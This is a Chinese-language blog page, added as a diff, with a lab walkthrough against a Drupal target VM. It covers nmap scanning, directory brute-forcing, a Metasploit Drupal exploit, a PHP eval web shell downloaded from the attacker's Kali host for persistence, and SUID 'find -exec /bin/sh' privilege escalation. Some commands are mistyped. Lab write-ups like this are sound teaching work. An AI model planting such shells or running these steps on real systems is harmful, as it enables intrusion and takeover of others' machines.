@@ -1,0 +1,251 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>信息收集 | k-onlの狗窝</title>
+    <meta name="author" content="k-onl" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/fufu1.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/lolisister1.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>K-ONLの狗窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;搜索</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;K-ONLの狗窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">搜索</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>信息收集</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/1
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="1，获得IP地址"><a href="#1，获得IP地址" class="headerlink" title="1，获得IP地址"></a>1，获得IP地址</h2><p>靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101215856651.png" alt="image-20240101215856651"><img src="/../../../../../Users/mio/AppData/Roaming/Typora/typora-user-images/image-20240101215856651.png" alt="image-20240101215856651"><br>先查看当前Kali的IP为：192.168.2.100</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101215903726.png" alt="image-20240101215903726"><br>在Kali中ping</p>
+<p>该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.2.100/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101215911525.png" alt="image-20240101215911525"></p>
+<h2 id="2，扫描靶机的IP有哪些开放的端口"><a href="#2，扫描靶机的IP有哪些开放的端口" class="headerlink" title="2，扫描靶机的IP有哪些开放的端口"></a>2，扫描靶机的IP有哪些开放的端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map -p1-500 -v 192.168.2.119</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220002123.png" alt="image-20240101220002123"><br>通过上图可以看到，靶机开放了22，80，111三个端口，其中80端口时http服务端口，用浏览器打开看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220023839.png" alt="image-20240101220023839"></p>
+<p>尝试用admin-admin&#x2F;admin123等弱密码登录，无法成功</p>
+<h2 id="3，目录扫描，寻找有关漏洞信息的文件"><a href="#3，目录扫描，寻找有关漏洞信息的文件" class="headerlink" title="3，目录扫描，寻找有关漏洞信息的文件"></a>3，目录扫描，寻找有关漏洞信息的文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.2.119&quot; -x 403,404 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220056486.png" alt="image-20240101220056486"></p>
+<p>将以上文件在浏览器中打开看看</p>
+<p>在<a target="_blank" rel="noopener" href="http://192.168.2.119/UPGRADE.txt%E4%B8%AD%E5%8F%91%E7%8E%B0">http://192.168.2.119/UPGRADE.txt中发现</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220109304.png" alt="image-20240101220109304"></p>
+<p>发现该网站是用Drupal技术搭建的，且版本为7.10之前</p>
+<p>去官网查看版本，发现这是2015年的版本了，说明其可能存在漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220127217.png" alt="image-20240101220127217"></p>
+<h2 id="4，用msfconsole获得shell"><a href="#4，用msfconsole获得shell" class="headerlink" title="4，用msfconsole获得shell"></a>4，用msfconsole获得shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole				打开msfconsole	</span><br><span class="line">search drupal			查看drupal有哪些漏洞</span><br></pre></td></tr></table></figure>
+
+<p>在以下漏洞中，我们选择2016年及其之后的使用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220148577.png" alt="image-20240101220148577"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220202692.png" alt="image-20240101220202692"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220220790.png" alt="image-20240101220220790"></p>
+<p>使用shell操控对方主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220306840.png" alt="image-20240101220306840"></p>
+<h2 id="5-权限维持"><a href="#5-权限维持" class="headerlink" title="5,权限维持"></a>5,权限维持</h2><p>在Kali中创建1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_GET[&quot;a&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>kala进入桌面的文件夹下后开启简易的web服务</p>
+<p>kala进入桌面的文件夹下后开启简易的web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m thhp.server 8081</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220404922.png" alt="image-20240101220404922"></p>
+<p>在拿到的shell中下载该1.php文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220417379.png" alt="image-20240101220417379"></p>
+<h2 id="6-提升权限"><a href="#6-提升权限" class="headerlink" title="6,提升权限"></a>6,提升权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br><span class="line">image-20240101180855301</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220505786.png" alt="image-20240101220505786"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20240101220511285.png" alt="image-20240101220511285"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 k-onlの狗窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;k-onl
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
